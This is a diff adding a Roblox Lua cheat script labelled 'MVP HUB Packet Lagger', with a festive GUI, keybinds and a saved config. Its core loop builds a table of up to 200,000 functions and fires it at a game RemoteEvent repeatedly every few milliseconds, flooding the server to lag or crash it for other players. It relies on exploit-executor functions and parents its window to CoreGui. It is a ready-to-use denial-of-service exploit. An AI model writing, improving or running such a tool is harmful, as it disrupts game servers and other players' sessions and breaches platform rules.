@@ -1,0 +1,480 @@
+if _G.__PacketLagger and _G.__PacketLagger.Destroy then
+ pcall(_G.__PacketLagger.Destroy)
+end
+
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local MIN_V, MAX_V = 1000, 200000
+local NET_INDEX = 6
+local DEFAULT_VALUE = 22000
+
+-- Keybinds por defecto
+local DEFAULT_KB_PC = Enum.KeyCode.F6
+local DEFAULT_KB_GAMEPAD = Enum.KeyCode.DPadDown
+
+local function getRemote()
+ local pk = ReplicatedStorage:FindFirstChild("Packages") or ReplicatedStorage:WaitForChild("Packages", 10)
+ if not pk then return nil end
+ local net = pk:FindFirstChild("Net") or pk:WaitForChild("Net", 10)
+ if not net then return nil end
+ local child = net:GetChildren()[NET_INDEX]
+ if child and child:IsA("BaseRemoteEvent") then
+  return child
+ end
+ return nil
+end
+
+local CFG_PATH = "MVPHubPacket_cfg.json"
+
+local function readCfg()
+ local ok, raw = pcall(function()
+  if isfile and isfile(CFG_PATH) then
+  return readfile(CFG_PATH)
+  end
+  return nil
+ end)
+ if ok and type(raw) == "string" and raw ~= "" then
+  local ok2, data = pcall(function() return HttpService:JSONDecode(raw) end)
+  if ok2 and type(data) == "table" then return data end
+ end
+ return {}
+end
+
+local function saveCfg(key, val)
+ local data = readCfg()
+ data[key] = val
+ local ok, encoded = pcall(function() return HttpService:JSONEncode(data) end)
+ if ok and writefile then
+  pcall(writefile, CFG_PATH, encoded)
+ end
+end
+
+local cfg = readCfg()
+local initValue = math.clamp(tonumber(cfg.value) or DEFAULT_VALUE, MIN_V, MAX_V)
+local initPos = UDim2.new(0.5, -110, 0.4, 0)
+if type(cfg.pos) == "table" and #cfg.pos == 4 then
+ initPos = UDim2.new(cfg.pos[1], cfg.pos[2], cfg.pos[3], cfg.pos[4])
+end
+
+-- Cargar keybinds guardadas (o usar defaults)
+local function loadKeyCode(name, default)
+ local saved = cfg[name]
+ if saved and Enum.KeyCode[saved] then
+  return Enum.KeyCode[saved]
+ end
+ return default
+end
+local KB_PC = loadKeyCode("kb_pc", DEFAULT_KB_PC)
+local KB_GAMEPAD = loadKeyCode("kb_gamepad", DEFAULT_KB_GAMEPAD)
+
+-- Paleta navideña
+local C = {
+ bg  = Color3.fromRGB(13, 30, 15),
+ bgTop = Color3.fromRGB(18, 22, 10),
+ row  = Color3.fromRGB(25, 55, 28),
+ stroke  = Color3.fromRGB(180, 30, 30),
+ strokeGold = Color3.fromRGB(210, 170, 50),
+ text  = Color3.fromRGB(255, 245, 220),
+ dim  = Color3.fromRGB(160, 190, 160),
+ on  = Color3.fromRGB(220, 40, 40),
+ onText  = Color3.fromRGB(255, 230, 200),
+ btnOff  = Color3.fromRGB(30, 70, 35),
+ snowflake = Color3.fromRGB(200, 230, 255),
+ listening = Color3.fromRGB(180, 130, 0),
+}
+
+local function New(class, props)
+ local o = Instance.new(class)
+ for k, v in pairs(props or {}) do o[k] = v end
+ return o
+end
+
+local function corner(o, r)
+ return New("UICorner", { CornerRadius = UDim.new(0, r), Parent = o })
+end
+
+local function guiParent()
+ local ok, h = pcall(function() return gethui and gethui() end)
+ if ok and h then return h end
+ local ok2 = pcall(function() return CoreGui.Name end)
+ if ok2 then return CoreGui end
+ return LocalPlayer:WaitForChild("PlayerGui")
+end
+
+-- GUI principal
+local gui = New("ScreenGui", {
+ Name = "ZYRVXHubPacket",
+ ResetOnSpawn = false,
+ DisplayOrder = 2147483000,
+ IgnoreGuiInset = true,
+})
+
+local win = New("Frame", {
+ Position = initPos,
+ Size = UDim2.fromOffset(220, 210),
+ BackgroundColor3 = C.bg,
+ BorderSizePixel = 0,
+ Active = true,
+ Parent = gui,
+ ClipsDescendants = true,
+})
+corner(win, 10)
+
+New("UIStroke", { Color = C.strokeGold, Thickness = 2, Parent = win })
+
+local innerBorder = New("Frame", {
+ Size = UDim2.new(1, -4, 1, -4),
+ Position = UDim2.fromOffset(2, 2),
+ BackgroundTransparency = 1,
+ BorderSizePixel = 0,
+ Parent = win,
+})
+New("UIStroke", { Color = C.stroke, Thickness = 1, Parent = innerBorder })
+corner(innerBorder, 9)
+
+-- Cabecera
+local head = New("Frame", {
+ Size = UDim2.new(1, 0, 0, 44),
+ BackgroundColor3 = Color3.fromRGB(10, 45, 12),
+ BorderSizePixel = 0,
+ Parent = win,
+})
+corner(head, 10)
+New("Frame", {
+ Size = UDim2.new(1, 0, 0, 10),
+ Position = UDim2.new(0, 0, 1, -10),
+ BackgroundColor3 = Color3.fromRGB(10, 45, 12),
+ BorderSizePixel = 0,
+ Parent = head,
+})
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "❄️", TextSize = 13,
+ Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left,
+ Position = UDim2.fromOffset(8, 0), Size = UDim2.new(0, 24, 1, 0), Parent = head,
+})
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "MVP HUB", TextSize = 11,
+ TextColor3 = C.strokeGold, Font = Enum.Font.GothamBold,
+ TextXAlignment = Enum.TextXAlignment.Center,
+ Size = UDim2.new(1, 0, 0, 22), Position = UDim2.fromOffset(0, 4), Parent = head,
+})
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "🎄 Packet Lagger 🎄", TextSize = 9,
+ TextColor3 = Color3.fromRGB(180, 230, 180), Font = Enum.Font.Gotham,
+ TextXAlignment = Enum.TextXAlignment.Center,
+ Size = UDim2.new(1, 0, 0, 16), Position = UDim2.new(0, 0, 0, 25), Parent = head,
+})
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "❄️", TextSize = 13,
+ Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Right,
+ Position = UDim2.new(1, -32, 0, 0), Size = UDim2.new(0, 24, 1, 0), Parent = head,
+})
+
+-- Separador dorado
+New("Frame", {
+ Position = UDim2.new(0, 10, 0, 44),
+ Size = UDim2.new(1, -20, 0, 1),
+ BackgroundColor3 = C.strokeGold,
+ BorderSizePixel = 0, Parent = win,
+})
+
+-- Fila del valor
+local boxRow = New("Frame", {
+ Position = UDim2.fromOffset(10, 52),
+ Size = UDim2.new(1, -20, 0, 30),
+ BackgroundColor3 = C.row, BorderSizePixel = 0, Parent = win,
+})
+corner(boxRow, 7)
+New("UIStroke", { Color = Color3.fromRGB(50, 110, 55), Thickness = 1, Parent = boxRow })
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "🎁 Value", TextSize = 10,
+ TextColor3 = C.text, Font = Enum.Font.GothamBold,
+ TextXAlignment = Enum.TextXAlignment.Left,
+ Position = UDim2.fromOffset(10, 0), Size = UDim2.new(0.42, 0, 1, 0), Parent = boxRow,
+})
+local boxWrap = New("Frame", {
+ AnchorPoint = Vector2.new(1, 0.5),
+ Position = UDim2.new(1, -6, 0.5, 0),
+ Size = UDim2.new(0.52, 0, 0, 20),
+ BackgroundColor3 = Color3.fromRGB(8, 22, 10), BorderSizePixel = 0, Parent = boxRow,
+})
+corner(boxWrap, 5)
+New("UIStroke", { Color = C.strokeGold, Thickness = 1, Parent = boxWrap })
+local box = New("TextBox", {
+ Size = UDim2.new(1, -10, 1, 0), Position = UDim2.fromOffset(5, 0),
+ BackgroundTransparency = 1, Text = tostring(initValue),
+ PlaceholderText = MIN_V .. " - " .. MAX_V, PlaceholderColor3 = C.dim,
+ TextColor3 = C.strokeGold, Font = Enum.Font.Code, TextSize = 10,
+ ClearTextOnFocus = false, TextXAlignment = Enum.TextXAlignment.Center,
+ Parent = boxWrap,
+})
+
+New("Frame", {
+ Position = UDim2.new(0, 10, 0, 90),
+ Size = UDim2.new(1, -20, 0, 1),
+ BackgroundColor3 = Color3.fromRGB(50, 90, 55),
+ BorderSizePixel = 0, Parent = win,
+})
+
+-- Botón ON/OFF
+local on = false
+local btn = New("TextButton", {
+ Position = UDim2.fromOffset(10, 98),
+ Size = UDim2.new(1, -20, 0, 34),
+ AutoButtonColor = false,
+ Text = "🔴 POWER OFF", TextSize = 11,
+ TextColor3 = C.text, Font = Enum.Font.GothamBold,
+ BackgroundColor3 = C.btnOff, BorderSizePixel = 0, Parent = win,
+})
+corner(btn, 8)
+New("UIStroke", { Color = Color3.fromRGB(50, 120, 55), Thickness = 1, Parent = btn })
+
+-- Separador keybinds
+New("Frame", {
+ Position = UDim2.new(0, 10, 0, 138),
+ Size = UDim2.new(1, -20, 0, 1),
+ BackgroundColor3 = Color3.fromRGB(50, 90, 55),
+ BorderSizePixel = 0, Parent = win,
+})
+
+-- ── Fila keybind PC ──────────────────────────────────────────────────────────
+local rowPC = New("Frame", {
+ Position = UDim2.fromOffset(10, 145),
+ Size = UDim2.new(1, -20, 0, 26),
+ BackgroundColor3 = C.row, BorderSizePixel = 0, Parent = win,
+})
+corner(rowPC, 6)
+New("UIStroke", { Color = Color3.fromRGB(50, 110, 55), Thickness = 1, Parent = rowPC })
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "⌨ PC", TextSize = 9,
+ TextColor3 = C.text, Font = Enum.Font.GothamBold,
+ TextXAlignment = Enum.TextXAlignment.Left,
+ Position = UDim2.fromOffset(8, 0), Size = UDim2.new(0.35, 0, 1, 0), Parent = rowPC,
+})
+local btnPC = New("TextButton", {
+ AnchorPoint = Vector2.new(1, 0.5),
+ Position = UDim2.new(1, -5, 0.5, 0),
+ Size = UDim2.new(0.6, 0, 0, 18),
+ AutoButtonColor = false,
+ Text = KB_PC.Name, TextSize = 9,
+ TextColor3 = C.strokeGold, Font = Enum.Font.Code,
+ BackgroundColor3 = Color3.fromRGB(8, 22, 10), BorderSizePixel = 0, Parent = rowPC,
+})
+corner(btnPC, 4)
+New("UIStroke", { Color = C.strokeGold, Thickness = 1, Parent = btnPC })
+
+-- ── Fila keybind Gamepad ─────────────────────────────────────────────────────
+local rowGP = New("Frame", {
+ Position = UDim2.fromOffset(10, 177),
+ Size = UDim2.new(1, -20, 0, 26),
+ BackgroundColor3 = C.row, BorderSizePixel = 0, Parent = win,
+})
+corner(rowGP, 6)
+New("UIStroke", { Color = Color3.fromRGB(50, 110, 55), Thickness = 1, Parent = rowGP })
+New("TextLabel", {
+ BackgroundTransparency = 1, Text = "🎮 Pad", TextSize = 9,
+ TextColor3 = C.text, Font = Enum.Font.GothamBold,
+ TextXAlignment = Enum.TextXAlignment.Left,
+ Position = UDim2.fromOffset(8, 0), Size = UDim2.new(0.35, 0, 1, 0), Parent = rowGP,
+})
+local btnGP = New("TextButton", {
+ AnchorPoint = Vector2.new(1, 0.5),
+ Position = UDim2.new(1, -5, 0.5, 0),
+ Size = UDim2.new(0.6, 0, 0, 18),
+ AutoButtonColor = false,
+ Text = KB_GAMEPAD.Name, TextSize = 9,
+ TextColor3 = C.strokeGold, Font = Enum.Font.Code,
+ BackgroundColor3 = Color3.fromRGB(8, 22, 10), BorderSizePixel = 0, Parent = rowGP,
+})
+corner(btnGP, 4)
+New("UIStroke", { Color = C.strokeGold, Thickness = 1, Parent = btnGP })
+
+-- ── Lógica principal ─────────────────────────────────────────────────────────
+local Packet = { value = initValue, remote = nil }
+_G.__PacketLagger = Packet
+local alive = true
+local fireserving = false
+local fireThread = nil
+
+local function stopFireServer()
+ if not fireserving then return end
+ fireserving = false
+ if fireThread then pcall(task.cancel, fireThread); fireThread = nil end
+end
+
+local function startFireServer()
+ if fireserving then return end
+ local remote = Packet.remote
+ if not remote then return end
+ fireserving = true
+ local payload = table.create(Packet.value, function() end)
+ fireThread = task.spawn(function()
+  while fireserving and alive do
+  for _ = 1, 3 do pcall(function() remote:FireServer(payload) end) end
+  task.wait(0.01)
+  end
+ end)
+end
+
+local function readValue()
+ local n = tonumber((box.Text:gsub("[^%d]", "")))
+ n = math.clamp(math.floor(n or Packet.value or DEFAULT_VALUE), MIN_V, MAX_V)
+ box.Text = tostring(n); Packet.value = n
+ return n
+end
+
+box.FocusLost:Connect(function()
+ readValue(); saveCfg("value", Packet.value)
+end)
+
+local btnStroke = btn:FindFirstChildOfClass("UIStroke")
+
+local function paint()
+ if on then
+  btn.BackgroundColor3 = C.on
+  btn.Text = "🟢 POWER ON"
+  btn.TextColor3 = Color3.fromRGB(255, 230, 200)
+  if btnStroke then btnStroke.Color = Color3.fromRGB(255, 80, 80) end
+ else
+  btn.BackgroundColor3 = C.btnOff
+  btn.Text = "🔴 POWER OFF"
+  btn.TextColor3 = C.text
+  if btnStroke then btnStroke.Color = Color3.fromRGB(50, 120, 55) end
+ end
+end
+
+local function setOn(v)
+ on = v and true or false
+ if on then
+  readValue()
+  if not Packet.remote then Packet.remote = getRemote() end
+  if not alive then return end
+  if Packet.remote then startFireServer() else on = false end
+ else
+  stopFireServer()
+ end
+ paint()
+end
+
+btn.Activated:Connect(function() setOn(not on) end)
+
+-- ── Selector de keybind ───────────────────────────────────────────────────────
+-- Teclas ignoradas (no se aceptan como keybind)
+local IGNORED_KEYS = {
+ [Enum.KeyCode.Unknown] = true,
+ [Enum.KeyCode.Return] = true,
+ [Enum.KeyCode.Escape] = true,
+}
+
+local listeningFor = nil -- "pc" | "gamepad" | nil
+local listenConn = nil
+
+local function stopListening()
+ listeningFor = nil
+ if listenConn then listenConn:Disconnect(); listenConn = nil end
+ btnPC.Text = KB_PC.Name
+ btnGP.Text = KB_GAMEPAD.Name
+ btnPC.BackgroundColor3 = Color3.fromRGB(8, 22, 10)
+ btnGP.BackgroundColor3 = Color3.fromRGB(8, 22, 10)
+ btnPC.TextColor3 = C.strokeGold
+ btnGP.TextColor3 = C.strokeGold
+end
+
+local function startListening(which)
+ -- Si ya estaba escuchando ese mismo, cancelar
+ if listeningFor == which then stopListening(); return end
+ stopListening()
+ listeningFor = which
+
+ -- Resaltar el botón en espera
+ local activeBtn = which == "pc" and btnPC or btnGP
+ activeBtn.Text = "..."
+ activeBtn.BackgroundColor3 = C.listening
+ activeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ listenConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+  -- Escape cancela sin asignar
+  if input.KeyCode == Enum.KeyCode.Escape then
+  stopListening(); return
+  end
+  -- Ignorar teclas sin KeyCode válido
+  if input.KeyCode == Enum.KeyCode.Unknown then return end
+  -- Aceptar cualquier tecla sin importar el tipo de input
+  if which == "pc" then
+  KB_PC = input.KeyCode
+  saveCfg("kb_pc", tostring(KB_PC.Name))
+  else
+  KB_GAMEPAD = input.KeyCode
+  saveCfg("kb_gamepad", tostring(KB_GAMEPAD.Name))
+  end
+  stopListening()
+ end)
+end
+
+btnPC.Activated:Connect(function() startListening("pc") end)
+btnGP.Activated:Connect(function() startListening("gamepad") end)
+
+-- ── Keybind toggle ────────────────────────────────────────────────────────────
+local kbCooldown = false
+local function onToggleKeybind()
+ if kbCooldown then return end
+ kbCooldown = true
+ setOn(not on)
+ task.delay(0.3, function() kbCooldown = false end)
+end
+
+local globalConns = {}
+
+globalConns[#globalConns + 1] = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+ if listeningFor then return end -- no disparar mientras asigna keybind
+ if gameProcessed then return end
+ if input.KeyCode == KB_PC or input.KeyCode == KB_GAMEPAD then
+  onToggleKeybind()
+ end
+end)
+
+-- ── Arrastrar ventana ─────────────────────────────────────────────────────────
+do
+ local dragging, startPos, startMouse
+ head.InputBegan:Connect(function(i)
+  if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+  dragging, startPos, startMouse = true, win.Position, i.Position
+  end
+ end)
+ globalConns[#globalConns + 1] = UserInputService.InputChanged:Connect(function(i)
+  if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+  local d = i.Position - startMouse
+  win.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+  end
+ end)
+ globalConns[#globalConns + 1] = UserInputService.InputEnded:Connect(function(i)
+  if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+  if dragging then
+   saveCfg("pos", { win.Position.X.Scale, win.Position.X.Offset, win.Position.Y.Scale, win.Position.Y.Offset })
+  end
+  dragging = false
+  end
+ end)
+end
+
+task.spawn(function()
+ local r = getRemote()
+ if alive and r then Packet.remote = r end
+end)
+
+function Packet.Destroy()
+ alive = false
+ stopFireServer()
+ stopListening()
+ for _, c in ipairs(globalConns) do pcall(function() c:Disconnect() end) end
+ table.clear(globalConns)
+ pcall(function() gui:Destroy() end)
+ if _G.__PacketLagger == Packet then _G.__PacketLagger = nil end
+end
+
+gui.Parent = guiParent()
